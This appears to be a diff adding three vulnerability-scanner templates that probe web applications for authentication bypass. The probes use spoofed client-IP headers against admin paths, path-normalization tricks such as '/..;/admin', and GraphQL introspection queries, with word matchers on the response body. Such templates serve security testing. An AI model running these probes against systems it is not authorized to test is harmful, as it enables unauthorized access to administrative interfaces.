@@ -1,0 +1,91 @@
+id: auth-bypass-headers
+info:
+  name: Authentication Bypass via Spoofed Headers
+  author: AniipID
+  severity: high
+  description: Tests for auth bypass using X-Forwarded-For, X-Real-IP, X-Originating-IP headers
+  tags: auth-bypass,headers,spoofing
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/api/admin"
+      - "{{BaseURL}}/wp-admin"
+      - "{{BaseURL}}/administrator"
+    headers:
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
+      X-Remote-IP: 127.0.0.1
+      X-Client-IP: 127.0.0.1
+      X-Host: localhost
+      X-Forwarded-Host: localhost
+    matchers:
+      - type: word
+        words:
+          - "dashboard"
+          - "admin"
+          - "wp-admin"
+          - "Drupal"
+          - "control panel"
+        condition: or
+        part: body
+
+---
+id: auth-bypass-path-normalization
+info:
+  name: Authentication Bypass via Path Normalization
+  author: AniipID
+  severity: high
+  description: Tests for auth bypass using path traversal and normalization techniques
+  tags: auth-bypass,path,normalization
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/../"
+      - "{{BaseURL}}/./admin"
+      - "{{BaseURL}}/admin;/"
+      - "{{BaseURL}}/..;/admin"
+      - "{{BaseURL}}/ADMIN"
+      - "{{BaseURL}}/Admin"
+    matchers:
+      - type: word
+        words:
+          - "dashboard"
+          - "admin panel"
+          - "users"
+          - "settings"
+          - "configuration"
+        condition: or
+        part: body
+
+---
+id: auth-bypass-graphql
+info:
+  name: GraphQL Auth Bypass via Introspection
+  author: AniipID
+  severity: high
+  description: Tests for GraphQL introspection queries that bypass authentication
+  tags: auth-bypass,graphql,introspection
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/graphql"
+      - "{{BaseURL}}/v1/graphql"
+    headers:
+      Content-Type: application/json
+    body: '{"query": "{__schema{types{name,fields{name,type{name}}}}}"}'
+    matchers:
+      - type: word
+        words:
+          - "Query"
+          - "Mutation"
+          - "Subscription"
+          - "type"
+          - "fields"
+        condition: or
+        part: body
